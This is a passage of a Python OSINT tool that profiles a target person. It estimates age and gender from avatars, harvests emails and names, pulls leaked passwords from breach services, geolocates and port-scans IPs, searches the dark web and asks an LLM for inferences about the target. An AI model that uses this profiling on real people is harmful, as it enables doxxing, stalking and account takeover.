        G.add_node(node_id, type=node_dict['type'], value=node_dict['value'], color=color)
        if parent:
            G.add_edge(parent, node_id)
        for child in node_dict.get("children", []):
            add_to_graph(child, node_id)

    root = data.get("root", {})
    add_to_graph(root)

    try:
        from pyvis.network import Network
        net = Network(height="700px", width="100%", directed=True, bgcolor="#1a1a2e", font_color="white")
        net.set_options("""
        {
            "nodes": {
                "font": {"size": 14, "color": "white"},
                "borderWidth": 2,
                "shadow": {"enabled": true}
            },
            "edges": {
                "arrows": {"to": {"enabled": true}},
                "color": {"color": "#4a4a6a", "highlight": "#00d2ff"},
                "smooth": {"type": "curvedCW"}
            },
            "physics": {
                "barnesHut": {"gravitationalConstant": -3000, "springLength": 200},
                "minVelocity": 0.75
            },
            "interaction": {"hover": true, "tooltipDelay": 200},
            "backgroundColor": "#1a1a2e"
        }
        """)

        for node_id, node_data in G.nodes(data=True):
            label = f"{node_data.get('type', '')}: {node_data.get('value', '')[:30]}"
            color = node_data.get('color', '#636e72')
            title = f"<b>Type:</b> {node_data['type']}<br><b>Value:</b> {node_data['value']}"
            net.add_node(node_id, label=label, color=color, title=title, size=25)

        for src, dst in G.edges():
            net.add_edge(src, dst)

        net.save_graph(output_file)
        return output_file
    except ImportError:
        import matplotlib.pyplot as plt
        plt.figure(figsize=(16, 12))
        pos = nx.spring_layout(G, k=2, iterations=50)
        node_colors = [G.nodes[n].get('color', '#636e72') for n in G.nodes()]
        nx.draw(G, pos, with_labels=True, node_color=node_colors, node_size=2000,
                font_size=8, font_color='white', edge_color='#4a4a6a',
                arrows=True, arrowstyle='->', arrowsize=15)
        plt.savefig(output_file.replace('.html', '.png'), dpi=150, bbox_inches='tight', facecolor='#1a1a2e')
        return output_file.replace('.html', '.png')

def visualization_menu():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} INVESTIGATION GRAPH")
    print(f" {Wh}{'='*50}")

    report_files = list(Path(CONFIG["output_dir"]).glob("agentic_ai_*.json"))
    if not report_files:
        print(f"{Y}[!] No agentic investigation reports found.{Wh}")
        print(f"{Y}    Run Agentic AI Investigation first (option 13).{Wh}")
        print(f"{Y}    Or place a JSON report in: {CONFIG['output_dir']}/{Wh}")
        custom_path = input(f"\n{Wh}[+] Path to JSON report {Gr}[or Enter to skip]{Wh}: {Gr}").strip()
        if custom_path and os.path.exists(custom_path):
            report_files = [Path(custom_path)]
        else:
            input(f"\n{Wh}[+] Press Enter")
            return

    if len(report_files) > 1:
        print(f"\n{Wh}[*] Available reports:{Wh}")
        for i, f in enumerate(report_files, 1):
            print(f"    {R}[{Gr}{i}{R}]{Wh} {f.name}")
        choice = input(f"\n{Wh}[+] Select {Gr}[1-{len(report_files)}]{Wh}: {Gr}").strip()
        if not choice.isdigit() or int(choice) < 1 or int(choice) > len(report_files):
            return
        selected = report_files[int(choice) - 1]
    else:
        selected = report_files[0]

    try:
        with open(selected, "r", encoding="utf-8") as f:
            report = json.load(f)
    except:
        print(f"{R}[!] Could not read report file{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    print(f"\n{Y}[*] Generating visualization graph...{Wh}")

    output_name = f"graph_{selected.stem}.html"
    output_path = str(Path(CONFIG["output_dir"]) / output_name)
    result = create_investigation_graph(report.get("data", {}), output_path)

    if result and os.path.exists(result):
        print(f"{Gr}[+] Graph saved: {C}{result}{RS}")
        print(f"    Open in browser to view interactive visualization")
    else:
        print(f"{Y}[!] Graph generation failed: {result}{Wh}")

    input(f"\n{Wh}[+] Press Enter")


AGE_GENDER_CONFIG = {
    "model": "deepface",
    "min_face_size": 80,
}

def detect_age_gender(image_path: str) -> Dict:
    result = {
        "age": None, "gender": None, "gender_confidence": None,
        "faces_detected": 0, "error": None,
    }

    if not os.path.exists(image_path):
        result["error"] = "File not found"
        return result

    try:
        from deepface import DeepFace
        analysis = DeepFace.analyze(img_path=image_path, actions=['age', 'gender'], enforce_detection=False)
        if isinstance(analysis, list):
            analysis = analysis[0] if analysis else {}
        result["age"] = analysis.get("age", None)
        result["gender"] = analysis.get("dominant_gender", None)
        if "gender" in analysis:
            gender_dict = analysis.get("gender", {})
            if isinstance(gender_dict, dict) and result["gender"] in gender_dict:
                result["gender_confidence"] = f"{gender_dict[result['gender']]:.1f}%"
        result["faces_detected"] = 1
        result["model"] = "DeepFace"
        return result
    except ImportError:
        pass
    except Exception as e:
        result["debug"] = f"DeepFace: {str(e)[:50]}"

    try:
        import cv2
        face_cascade = cv2.CascadeClassifier(
            cv2.data.haarcascades + "haarcascade_frontalface_default.xml"
        )
        img = cv2.imread(image_path)
        if img is None:
            result["error"] = "Could not read image"
            return result

        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        faces = face_cascade.detectMultiScale(gray, 1.1, 4)
        result["faces_detected"] = len(faces)

        for (x, y, w, h) in faces:
            face_roi = gray[y:y+h, x:x+w]
            face_rgb = cv2.cvtColor(img[y:y+h, x:x+w], cv2.COLOR_BGR2RGB)

            try:
                blob = cv2.dnn.blobFromImage(face_rgb, 1.0, (227, 227),
                    (78.4263377603, 87.7689143744, 114.895847746), swapRB=False)

                age_net = cv2.dnn.readNetFromCaffe(
                    cv2.data.haarcascades + "deploy_age.prototxt",
                    cv2.data.haarcascades + "age_net.caffemodel"
                ) if os.path.exists(cv2.data.haarcascades + "age_net.caffemodel") else None

                gender_net = cv2.dnn.readNetFromCaffe(
                    cv2.data.haarcascades + "deploy_gender.prototxt",
                    cv2.data.haarcascades + "gender_net.caffemodel"
                ) if os.path.exists(cv2.data.haarcascades + "gender_net.caffemodel") else None

                if gender_net:
                    gender_list = ['Male', 'Female']
                    gender_net.setInput(blob)
                    gender_preds = gender_net.forward()
                    gender_idx = gender_preds[0].argmax()
                    result["gender"] = gender_list[gender_idx]
                    result["gender_confidence"] = f"{gender_preds[0][gender_idx] * 100:.1f}%"

                if age_net:
                    age_list = ['(0-2)', '(4-6)', '(8-12)', '(15-20)', '(25-32)', '(38-43)', '(48-53)', '(60-100)']
                    age_net.setInput(blob)
                    age_preds = age_net.forward()
                    age_idx = age_preds[0].argmax()
                    result["age"] = age_list[age_idx]
            except:
                pass
            break

        result["model"] = "OpenCV"
    except ImportError:
        result["error"] = "Need OpenCV: pip install opencv-python opencv-contrib-python"
    except Exception as e:
        result["error"] = str(e)[:80]

    return result

def analyze_profile_images_osint(username: str) -> Dict:
    results = {"images_analyzed": 0, "faces_detected": 0, "age_gender": [], "exif_data": []}
    session = get_session()

    avatar_urls = [
        f"https://github.com/{username}.png",
        f"https://gitlab.com/uploads/user/avatar/{username}.png",
    ]

    temp_dir = Path(CONFIG["output_dir"]) / "temp_avatars"
    temp_dir.mkdir(parents=True, exist_ok=True)

    for url in avatar_urls:
        try:
            resp = session.get(url, timeout=10)
            if resp.status_code == 200 and len(resp.content) > 1000:
                ext = url.split(".")[-1]
                fpath = temp_dir / f"{username}_{results['images_analyzed']}.{ext}"
                with open(fpath, "wb") as f:
                    f.write(resp.content)

                exif = extract_metadata(str(fpath))
                if exif:
                    results["exif_data"].append({"source": url, "metadata": exif})

                age_gender = detect_age_gender(str(fpath))
                if age_gender.get("age") or age_gender.get("gender"):
                    results["age_gender"].append({"source": url, **age_gender})
                    results["faces_detected"] += age_gender.get("faces_detected", 0)

                results["images_analyzed"] += 1
        except:
            pass

    return results

def age_gender_menu():
    print(f"\n {Wh}{'='*50}")
    print(f" {R} AGE & GENDER DETECTION")
    print(f" {Wh}{'='*50}")

    source = input(f"{Wh}[?] Source: {Gr}(1) Local image  (2) Username avatar scan{Wh}: {Gr}").strip()

    if source == "1":
        path = input(f"{Wh}[+] Image path: {Gr}").strip()
        if not os.path.exists(path):
            print(f"{R}[!] File not found{Wh}")
            input(f"\n{Wh}[+] Press Enter")
            return

        print(f"\n{Y}[*] Analyzing image: {os.path.basename(path)}{Wh}")
        result = detect_age_gender(path)

        print(f"\n{Wh} Results ")
        if result.get("error") and not result.get("age"):
            print(f"{Y}[!] {result['error']}{Wh}")
        print(f"{Wh} Faces Detected : {Gr}{result.get('faces_detected', 0)}")
        if result.get("age"):
            print(f"{Wh} Estimated Age  : {Gr}{result['age']}")
        if result.get("gender"):
            print(f"{Wh} Estimated Gender: {Gr}{result['gender']}")
        if result.get("gender_confidence"):
            print(f"{Wh} Confidence     : {Gr}{result['gender_confidence']}")
        if result.get("model"):
            print(f"{Wh} Model Used     : {Y}{result['model']}")

        exif = extract_metadata(path)
        if exif:
            print(f"\n{Y}[*] EXIF Metadata:{Wh}")
            for k in ["Make", "Model", "DateTimeOriginal", "GPS Latitude", "GPS Longitude", "Software"]:
                if k in exif:
                    print(f"    {Wh}{k}: {Gr}{exif[k][:80]}")

    elif source == "2":
        username = input(f"{Wh}[+] Username: {Gr}").strip()
        if not username:
            return
        print(f"\n{Y}[*] Analyzing profile images for '{username}'...{Wh}")
        results = analyze_profile_images_osint(username)

        print(f"\n{Wh} Results ")
        print(f"{Wh} Images Analyzed: {Gr}{results['images_analyzed']}")
        print(f"{Wh} Faces Detected : {Gr}{results['faces_detected']}")

        if results["age_gender"]:
            for entry in results["age_gender"]:
                print(f"\n{Wh} Source: {C}{entry.get('source', 'N/A')}")
                if entry.get("age"):
                    print(f"   Age    : {Gr}{entry['age']}")
                if entry.get("gender"):
                    print(f"   Gender : {Gr}{entry['gender']} ({entry.get('gender_confidence', 'N/A')})")

    input(f"\n{Wh}[+] Press Enter")

# 
# INVESTIGATION ORCHESTRATOR — DeepDive Engine
# 

@dataclass
class Finding:
    category: str
    value: str
    source: str
    confidence: str = "MEDIUM"
    metadata: Dict = None

    def to_dict(self):
        return {"category": self.category, "value": self.value, "source": self.source, "confidence": self.confidence, "metadata": self.metadata or {}}


@dataclass
class UnifiedProfile:
    target: str
    target_type: str
    timestamp: str = ""
    findings: List[Finding] = None
    pivot_graph: Dict = None

    def __post_init__(self):
        self.timestamp = datetime.now().isoformat()
        self.findings = self.findings or []
        self.pivot_graph = self.pivot_graph or {}

    def add(self, cat, val, src, conf="MEDIUM", meta=None):
        self.findings.append(Finding(cat, val, src, conf, meta))

    def get_by_category(self, cat):
        return [f for f in self.findings if f.category == cat]

    def all_values(self, cat):
        return list(set(f.value for f in self.findings if f.category == cat))

    def to_dict(self):
        return {
            "target": self.target, "target_type": self.target_type,
            "timestamp": self.timestamp,
            "findings": [f.to_dict() for f in self.findings],
            "pivot_graph": self.pivot_graph,
        }


class InvestigationOrchestrator:
    """DeepDive — Unified Intelligence Workflow Engine"""

    def __init__(self, target: str):
        self.target = target.strip()
        self.target_type = detect_target_type(self.target)
        self.profile = UnifiedProfile(self.target, self.target_type)
        self.start_time = time.time()
        self.phase_times = {}

    def _phase_header(self, phase: int, title: str):
        elapsed = time.time() - self.start_time
        print(f"\n {Wh}{'='*55}")
        print(f" {R} PHASE {phase}: {title}")
        print(f" {Wh}{'='*55}")
        print(f" {Y}[⏱ {elapsed:.1f}s elapsed]{Wh}")

    def _phase_footer(self, phase: int):
        self.phase_times[f"phase_{phase}"] = time.time() - self.start_time - sum(self.phase_times.values())

    def _extract_from_results(self, results, source_name):
        """استخراج الإيميلات والأرقام والحسابات من أي نص أو ديكت"""
        emails, phones, usernames, names = set(), set(), set(), set()
        raw = str(results)
        for m in re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', raw):
            if "noreply" not in m and "example" not in m:
                emails.add(m.lower())
        for m in re.findall(r'\+?\d{1,4}[\s-]?\d{6,12}', raw):
            clean = re.sub(r'\s', '', m)
            if len(clean) >= 8:
                phones.add(clean)
        for src_text in ([results] if isinstance(results, str) else [str(results)]):
            for m in re.findall(r'(?:username|user|handle)[:\s]+([a-zA-Z0-9_.\-]{3,30})', src_text, re.I):
                usernames.add(m.lower())
        pattern_analyzer = PatternAnalyzer()
        if isinstance(results, dict):
            for v in results.values():
                if isinstance(v, str) and len(v) > 20:
                    parsed = pattern_analyzer.analyze(v)
                    for e in parsed.get("emails", []):
                        emails.add(e["value"])
                    for n in parsed.get("names", []):
                        names.add(n["value"])
        return emails, phones, usernames, names

    def run(self):
        print(f"\n {R}{'='*55}")
        print(f" {Gr} DEEPDIVE — UNIFIED INTELLIGENCE WORKFLOW")
        print(f" {Wh}{'='*55}")
        print(f"{Wh}  Target     : {C}{self.target}")
        print(f"{Wh}  Type       : {Gr}{self.target_type}")
        print(f"{Wh}  Started    : {Y}{datetime.now().isoformat()}")
        print(f"{Wh}{'='*55}\n")

        #  Phase 1: Passive Recon 
        self._phase_header(1, "PASSIVE RECONNAISSANCE")
        self._phase1_passive()
        self._phase_footer(1)

        #  Phase 2: Surface Web 
        self._phase_header(2, "SURFACE WEB OSINT")
        self._phase2_surface_web()
        self._phase_footer(2)

        #  Phase 3: Technical Analysis 
        self._phase_header(3, "TECHNICAL ANALYSIS")
        self._phase3_technical()
        self._phase_footer(3)

        #  Phase 4: Deep/Dark Web 
        self._phase_header(4, "DEEP & DARK WEB")
        self._phase4_deep_dark()
        self._phase_footer(4)

        #  Phase 5: Correlation & Profile Building 
        self._phase_header(5, "CORRELATION & UNIFIED PROFILE")
        self._phase5_correlation()
        self._phase_footer(5)

        #  Phase 6: Reporting 
        self._phase_header(6, "REPORTING & VISUALIZATION")
        self._phase6_reporting()
        self._phase_footer(6)

        self._show_summary()

    def _phase1_passive(self):
        """Phase 1: جمع المعلومات الأساسية بدون تفاعل"""
        t = self.target_type

        if t == "email":
            domain = self.target.split("@")[1]
            username = self.target.split("@")[0]
            self.profile.add("domain", domain, "email_parse", "HIGH")
            self.profile.add("username", username, "email_parse", "MEDIUM")
            print(f"  {Gr}{Wh} Domain extracted: {C}{domain}")
            print(f"  {Gr}{Wh} Username extracted: {C}{username}")

            print(f"  {Y}[*] Checking breaches (HIBP + HudsonRock + ProxyNova)...{Wh}")
            breaches = check_email_breaches_advanced(self.target)
            bc = breaches.get("total_breaches", 0)
            if bc > 0:
                self.profile.add("breach", f"{bc} breaches", "hibp/hudson", "HIGH", breaches)
                print(f"  {R}  [!] Found in {bc} breaches{Wh}")
            passwords = breaches.get("passwords", [])
            if passwords:
                self.profile.add("password", passwords[0], "proxynova", "HIGH")
                print(f"  {R}  [!] Leaked password found{Wh}")

        elif t == "username":
            print(f"  {Y}[*] Generating email permutations...{Wh}")
            common_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'icloud.com']
            for d in common_domains:
                self.profile.add("possible_email", f"{self.target}@{d}", "email_permute", "LOW")
            print(f"  {Gr}{Wh} 5 possible emails generated")

        elif t == "phone":
            print(f"  {Y}[*] Extracting country code...{Wh}")
            for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
                clean = re.sub(r'\D', '', self.target)
                if clean.startswith(code) or self.target.startswith(f"+{code}"):
                    self.profile.add("country", COUNTRY_CODES[code], "phone_parse", "HIGH")
                    print(f"  {Gr}{Wh} Country: {C}{COUNTRY_CODES[code]}")
                    break

        elif t == "domain":
            print(f"  {Y}[*] Looking up DNS for {self.target}...{Wh}")
            dns_data = dns_lookup(self.target)
            ip = dns_data.get("A", "")
            if ip and ip != "Not found":
                self.profile.add("ip", ip, "dns_lookup", "HIGH")
                print(f"  {Gr}{Wh} IP resolved: {C}{ip}")

        print(f"  {Gr} Phase 1 complete{Wh}")

    def _phase2_surface_web(self):
        """Phase 2: البحث في الويب السطحي"""
        t = self.target_type
        search_target = self.target

        if t == "email":
            search_target = self.target.split("@")[0]

        # Username search on platforms
        print(f"  {Y}[*] Username search across platforms...{Wh}")
        try:
            engine = WhatsMyNameEngine()
            wmn_results = engine.search(search_target, categories=["social", "coding"], exclude_protected=True)
            for site in wmn_results.get("found", [])[:20]:
                self.profile.add("social_profile", site["name"], "whatsmyname", "HIGH", {"url": site["url"]})
            print(f"  {Gr}  [+] Found on {len(wmn_results['found'])}/{wmn_results['total']} sites{Wh}")
        except Exception as e:
            print(f"  {Y}  [!] WMN error: {str(e)[:40]}{Wh}")

        # GitHub search
        print(f"  {Y}[*] GitHub OSINT search...{Wh}")
        try:
            gh = github_search(search_target)
            if gh.get("users"):
                for u in gh["users"][:5]:
                    self.profile.add("github_user", u["login"], "github_osint", "HIGH", u)
                    if u.get("email"):
                        self.profile.add("email", u["email"], "github_profile", "HIGH")
                    if u.get("location"):
                        self.profile.add("location", u["location"], "github_profile", "MEDIUM")
                print(f"  {Gr}  [+] {len(gh['users'])} users, {len(gh['repos'])} repos found{Wh}")
            if gh.get("emails"):
                for e in gh["emails"]:
                    self.profile.add("email", e["email"], "github_commit", "HIGH")
        except Exception as e:
            print(f"  {Y}  [!] GitHub error: {str(e)[:40]}{Wh}")

        # Pastebin search
        print(f"  {Y}[*] Pastebin & psbdmp search...{Wh}")
        try:
            pb = pastebin_search(search_target)
            total_pastes = sum(len(v) for v in pb.values())
            if total_pastes:
                self.profile.add("paste", f"{total_pastes} pastes found", "pastebin_osint", "MEDIUM", pb)
                print(f"  {Gr}  [+] {total_pastes} pastes/leaks found{Wh}")
        except Exception as e:
            print(f"  {Y}  [!] Pastebin error{Wh}")

        # TeleSpotter multi-engine search
        print(f"  {Y}[*] Multi-engine web search (Google, Bing, DuckDuckGo)...{Wh}")
        try:
            sem = SearchEngineManager()
            web_results = sem.search_all(search_target)
            for eng, urls in web_results.items():
                if urls:
                    self.profile.add("web_result", f"{eng}: {len(urls)} URLs", "web_search", "MEDIUM")
            print(f"  {Gr}  [+] Web search completed{Wh}")

            # Pattern analysis on found URLs
            combined = ""
            all_urls = []
            for urls in web_results.values():
                all_urls.extend(urls[:5])
            for url in all_urls[:8]:
                try:
                    r = get_session().get(url, timeout=5)
                    combined += r.text + "\n"
                except:
                    pass
            if combined:
                pa = PatternAnalyzer()
                analysis = pa.analyze(combined)
                for e in analysis.get("emails", []):
                    self.profile.add("email", e["value"], "web_pattern", e.get("confidence", "MEDIUM"))
                for n in analysis.get("names", []):
                    self.profile.add("name", n["value"], "web_pattern", n.get("confidence", "MEDIUM"))
                for s in analysis.get("social_profiles", []):
                    self.profile.add("social_url", s["url"], "web_pattern", "MEDIUM")
                print(f"  {Gr}  [+] Extracted {len(analysis['emails'])} emails, {len(analysis['names'])} names from pages{Wh}")
        except Exception as e:
            print(f"  {Y}  [!] Web search error: {str(e)[:40]}{Wh}")

        print(f"  {Gr} Phase 2 complete{Wh}")

    def _phase3_technical(self):
        """Phase 3: التحليل التقني"""
        t = self.target_type
        collected_ips = self.profile.all_values("ip")
        collected_domains = self.profile.all_values("domain")

        # Add the target itself if applicable
        if t == "domain":
            collected_domains.append(self.target)
        elif t == "ip":
            collected_ips.append(self.target)
        elif t == "email":
            domain = self.target.split("@")[1]
            if domain not in collected_domains:
                collected_domains.append(domain)

        # Enrich each IP
        for ip in collected_ips:
            if not validate_ip(ip):
                continue
            print(f"  {Y}[*] Analyzing IP: {ip}{Wh}")
            try:
                ip_data = get_ip_info(ip)
                if ip_data:
                    self.profile.add("geo", f"{ip_data.get('city', '?')}, {ip_data.get('country', '?')}", "ip_geo", "HIGH", ip_data)
                    self.profile.add("isp", ip_data.get("connection", {}).get("isp", ip_data.get("isp", "?")), "ip_geo", "MEDIUM")
                    self.profile.add("asn", ip_data.get("connection", {}).get("asn", ip_data.get("as", "?")), "ip_geo", "MEDIUM")
                    print(f"  {Gr}  [+] Location: {C}{ip_data.get('city', '?')}, {ip_data.get('country', '?')}")

                    lat = ip_data.get("latitude", ip_data.get("lat"))
                    lon = ip_data.get("longitude", ip_data.get("lon"))
                    if lat and lon and lat != "N/A" and lon != "N/A":
                        try:
                            lat_f, lon_f = float(lat), float(lon)
                            self.profile.add("coordinates", f"{lat_f},{lon_f}", "ip_geo", "HIGH")
                            maps_url = f"https://www.google.com/maps?q={lat_f},{lon_f}"
                            print(f"  {Wh}  Maps: {C}{maps_url}")
                        except:
                            pass

                # Port scan (quick)
                print(f"  {Y}  [*] Quick port scan...{Wh}")
                ports = port_scan(ip)
                if ports:
                    open_ports = [f"{p}" for p in sorted(ports.keys())]
                    self.profile.add("open_ports", ", ".join(open_ports), "port_scan", "MEDIUM")
                    print(f"  {Gr}  [+] Open ports: {', '.join(open_ports)}")

                # Reputation
                rep = check_ip_reputation_free(ip)
                if rep.get("abuse_score", 0) > 0:
                    self.profile.add("abuse_score", str(rep["abuse_score"]), "ip_reputation", "MEDIUM")
                if rep.get("is_tor"):
                    self.profile.add("tor_node", "yes", "ip_reputation", "HIGH")
                    print(f"  {R}  [!] TOR exit node detected{Wh}")
                if rep.get("is_vpn"):
                    self.profile.add("vpn", "yes", "ip_reputation", "MEDIUM")
            except Exception as e:
                print(f"  {Y}  [!] IP analysis error: {str(e)[:40]}{Wh}")

        # Enrich each domain
        for domain in collected_domains:
            print(f"  {Y}[*] Analyzing domain: {domain}{Wh}")
            try:
                # DNS full records
                dns = dns_records_full(domain)
                if dns.get("A") and dns["A"] != "N/A":
                    ip = dns["A"]
                    if ip not in collected_ips:
                        self.profile.add("ip", ip, "domain_dns", "HIGH")
                        print(f"  {Gr}  [+] Resolved IP: {C}{ip}")

                # Subdomains
                subs = get_subdomains_crt(domain)
                if subs:
                    self.profile.add("subdomains", str(len(subs)), "crt_sh", "MEDIUM", {"list": subs[:20]})
                    print(f"  {Gr}  [+] {len(subs)} subdomains found via CRT.sh")

                # SSL
                ssl_info = check_ssl_cert(domain)
                if ssl_info and "error" not in ssl_info:
                    self.profile.add("ssl_issuer", ssl_info.get("Issuer", "?"), "ssl_check", "MEDIUM")
                    self.profile.add("ssl_expiry", ssl_info.get("Expiry", "?"), "ssl_check", "MEDIUM")

                # Technologies
                tech = get_domain_technologies(domain)
                for category, items in tech.items():
                    if items:
                        self.profile.add(f"tech_{category}", ", ".join(items), "tech_detect", "MEDIUM")

                # Wayback
                wb = wayback_check(domain)
                if wb.get("available"):
                    self.profile.add("wayback", wb.get("url", ""), "wayback", "LOW")
                    print(f"  {Wh}  [+] Archived version exists")

            except Exception as e:
                print(f"  {Y}  [!] Domain analysis error{Wh}")

        # If email target, do SMTP check
        if t == "email":
            print(f"  {Y}[*] SMTP verification for {self.target}...{Wh}")
            try:
                smtp = verify_email_smtp_advanced(self.target)
                self.profile.add("smtp_valid", str(smtp.get("valid", False)), "smtp_check", "HIGH")
                if smtp.get("valid"):
                    print(f"  {Gr}  [+] Email is valid (SMTP confirmed){Wh}")
                if smtp.get("mx_records"):
                    self.profile.add("mx", str([m["exchange"] for m in smtp["mx_records"][:3]]), "smtp_check", "MEDIUM")
            except Exception as e:
                print(f"  {Y}  [!] SMTP error{Wh}")

        print(f"  {Gr} Phase 3 complete{Wh}")

    def _phase4_deep_dark(self):
        """Phase 4: البحث في الويب العميق والمظلم + خروقات البيانات"""
        # --- DeHashed ---
        if DEHASHED_CONFIG["email"] and DEHASHED_CONFIG["api_key"]:
            print(f"  {Y}[*] DeHashed breach search...{Wh}")
            for cat in ["email", "username", "phone", "ip_address", "domain", "name"]:
                vals = self.profile.all_values(cat)
                if not vals:
                    continue
                for val in vals[:3]:  # Limit to 3 queries per category
                    try:
                        dh = search_dehashed(val, cat)
                        if "error" not in dh and dh.get("total", 0) > 0:
                            self.profile.add("dehashed_hit", f"{dh['total']} entries for {val}", "dehashed", "HIGH", dh)
                            print(f"  {R}  [!] DeHashed: {dh['total']} entries for {val}{Wh}")
                            for entry in dh.get("results", [])[:5]:
                                if entry.get("password") and entry["password"] != "N/A" and entry["password"] != "***":
                                    self.profile.add("leaked_password", entry["password"][:20], "dehashed", "CRITICAL")
                                if entry.get("email") and entry["email"] != "N/A":
                                    self.profile.add("email", entry["email"], "dehashed", "HIGH")
                                if entry.get("phone") and entry["phone"] != "N/A":
                                    self.profile.add("phone", entry["phone"], "dehashed", "HIGH")
                                break
                    except:
                        pass
        else:
            print(f"  {Y}  [!] DeHashed not configured (set DEHASHED_CONFIG){Wh}")

        # --- Dark Web ---
        tor_avail = False
        try:
            tor_avail = check_tor_available()
        except:
            pass

        if tor_avail:
            print(f"  {Y}[*] Dark web search via Ahmia...{Wh}")
            search_terms = self.profile.all_values("username") + self.profile.all_values("email") + self.profile.all_values("name") + [self.target]
            for term in search_terms[:3]:
                try:
                    dw = search_darkweb(term)
                    if dw.get("ahmia", {}).get("total", 0) > 0:
                        self.profile.add("darkweb_hit", f"{dw['ahmia']['total']} onion results for {term}", "darkweb", "HIGH", dw)
                        print(f"  {Gr}  [+] Dark web: {dw['ahmia']['total']} results for {term}")
                        for link in dw.get("ahmia", {}).get("onion_links", [])[:5]:
                            self.profile.add("onion_link", link, "darkweb", "MEDIUM")
                except:
                    pass
        else:
            print(f"  {Y}  [!] Tor not available — dark web search skipped{Wh}")

        print(f"  {Gr} Phase 4 complete{Wh}")

    def _phase5_correlation(self):
        """Phase 5: الربط وبناء الملف الموحد"""
        print(f"  {Y}[*] Building unified profile from all {len(self.profile.findings)} findings...{Wh}")

        # إحصائيات
        cats = {}
        for f in self.profile.findings:
            cats[f.category] = cats.get(f.category, 0) + 1

        print(f"  {Gr}  [+] Findings by category:{Wh}")
        for cat, count in sorted(cats.items(), key=lambda x: -x[1]):
            print(f"      {Wh}{cat:<20}: {C}{count}{Wh}")

        emails = self.profile.all_values("email")
        phones = self.profile.all_values("phone")
        usernames = self.profile.all_values("username")
        domains = self.profile.all_values("domain")
        names = self.profile.all_values("name")
        ips = self.profile.all_values("ip")

        # بناء الرسم البياني للربط
        pivot_graph = {}
        pivot_graph["target"] = self.target
        pivot_graph["edges"] = []
        if emails:
            pivot_graph["emails"] = emails
        if phones:
            pivot_graph["phones"] = phones
        if usernames:
            pivot_graph["usernames"] = usernames
        if domains:
            pivot_graph["domains"] = domains
        if names:
            pivot_graph["names"] = names
        if ips:
            pivot_graph["ips"] = ips

        self.profile.pivot_graph = pivot_graph

        # Reputation score
        print(f"  {Y}[*] Calculating reputation score...{Wh}")
        try:
            rep_engine = ReputationEngine()
            breach_count = len(self.profile.get_by_category("breach"))
            social_count = len(self.profile.get_by_category("social_profile"))
            leak_count = len(self.profile.get_by_category("leaked_password"))
            payload = {
                "results": {
                    "breaches": [{"name": "breach"}] * breach_count if breach_count else [],
                    "social_footprint": [{"exists": True}] * social_count if social_count else [],
                }
            }
            rep_result = rep_engine.score(payload)
            self.profile.add("reputation_score", f"{rep_result['score']}/100", "reputation_engine", "HIGH", rep_result)
            risk = rep_result["risk_level"]
            risk_color = {"CRITICAL": R, "HIGH": Y, "MEDIUM": Y, "LOW": Gr}.get(risk, Wh)
            print(f"  {Wh}  Risk Score: {risk_color}{rep_result['score']}/100 ({risk}){Wh}")
        except Exception as e:
            print(f"  {Y}  [!] Reputation error: {str(e)[:40]}{Wh}")

        print(f"  {Gr}  [+] Unified profile: {len(emails)} emails, {len(phones)} phones, {len(usernames)} usernames, {len(domains)} domains, {len(ips)} IPs, {len(names)} names")
        print(f"  {Gr} Phase 5 complete{Wh}")

    def _phase6_reporting(self):
        """Phase 6: التقرير النهائي والتصدير والرسم"""
        # Save JSON report
        report_data = self.profile.to_dict()
        report_data["phase_times"] = self.phase_times
        report_data["total_duration"] = time.time() - self.start_time

        result = ScanResult(
            timestamp=datetime.now().isoformat(),
            scan_type="deepdive",
            target=self.target,
            data=report_data
        )
        saved_path = save_report(result)

        # Try AI correlation if Groq is available
        if Groq is not None:
            api_key = os.environ.get("GROQ_API_KEY")
            if api_key:
                print(f"  {Y}[*] Running AI correlation via Groq...{Wh}")
                try:
                    client = Groq(api_key=api_key)
                    summary = {
                        "target": self.target,
                        "type": self.target_type,
                        "emails": self.profile.all_values("email"),
                        "phones": self.profile.all_values("phone"),
                        "usernames": self.profile.all_values("username"),
                        "domains": self.profile.all_values("domain"),
                        "ips": self.profile.all_values("ip"),
                        "names": self.profile.all_values("name"),
                        "breaches": [f.value for f in self.profile.findings if f.category == "breach"],
                        "social_profiles": [f.value for f in self.profile.findings if f.category == "social_profile"],
                    }
                    system_prompt = """You are an elite OSINT analyst. Analyze this intelligence data and provide:
1. Summary of what you know about the target
2. Cross-correlations between data points
3. Risk assessment (score 0-100)
4. Inferred insights not explicitly in data
5. Recommended next investigation steps
Respond concisely with clear sections."""
                    completion = client.chat.completions.create(
                        model=GROQ_MODEL,
                        messages=[
                            {"role": "system", "content": system_prompt},
                            {"role": "user", "content": json.dumps(summary, indent=2)}
                        ],
                        temperature=0.7, max_tokens=2048,
                    )
                    ai_analysis = completion.choices[0].message.content
                    print(f"\n  {Gr} AI INSIGHTS {RS}")
                    for line in ai_analysis.split("\n"):
                        print(f"  {Wh}{line}")
                    print(f"  {Wh}{''*30}{RS}")
                    self.profile.add("ai_analysis", ai_analysis[:200], "groq_correlation", "HIGH")
                except Exception as e:
                    print(f"  {Y}  [!] Groq error: {str(e)[:40]}{Wh}")

        # Try to generate visualization graph
        print(f"  {Y}[*] Generating investigation graph...{Wh}")
        try:
            import networkx as nx
            graph_path = str(Path(CONFIG["output_dir"]) / f"deepdive_graph_{int(time.time())}.html")
            if "root" not in report_data:
                report_data["root"] = {
                    "type": self.target_type, "value": self.target,
                    "findings": {}, "children": [
                        {"type": cat, "value": val, "findings": {}, "children": []}
                        for f in self.profile.findings[:50]
                        for cat, val in [(f.category, f.value)]
                    ]
                }
            viz_result = create_investigation_graph(report_data, graph_path)
            if viz_result and os.path.exists(viz_result):
                print(f"  {Gr}  [+] Graph saved: {C}{viz_result}")
        except Exception as e:
            print(f"  {Y}  [!] Graph generation skipped: {str(e)[:40]}{Wh}")

        print(f"  {Gr} Phase 6 complete{Wh}")

    def _show_summary(self):
        """عرض الملخص النهائي"""
        total = time.time() - self.start_time

        print(f"\n {Wh}{'='*55}")
        print(f" {Gr} DEEPDIVE INVESTIGATION COMPLETE")
        print(f" {Wh}{'='*55}")
        print(f"  {Wh}Target      : {C}{self.target}")
        print(f"  {Wh}Type        : {Gr}{self.target_type}")
